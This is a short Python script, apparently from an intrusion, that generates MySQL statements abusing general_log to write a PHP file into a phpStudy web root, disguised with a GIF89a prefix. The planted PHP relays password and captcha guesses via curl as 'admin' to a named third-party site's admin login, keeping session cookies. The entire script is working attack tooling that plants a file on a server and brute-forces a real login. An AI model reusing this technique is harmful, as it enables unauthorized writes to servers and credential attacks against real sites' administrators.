#!/usr/bin/env python3
"""gen_loginpost.py - 生成loginpost.php(81.70提交yangsha登录)"""
body = '<?php $pw=$_GET["p"];$code=$_GET["c"];$jar="C:/phpStudy/WWW/ys_c.txt";$ch=curl_init("http://www.yangsha.com/admin/login.asp?action=check");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"username=admin&password=".$pw."&Code=".$code);curl_setopt($ch,CURLOPT_COOKIEJAR,$jar);curl_setopt($ch,CURLOPT_COOKIEFILE,$jar);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_TIMEOUT,12);$r=curl_exec($ch);echo $r;?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/loginpost.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/loginpost.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
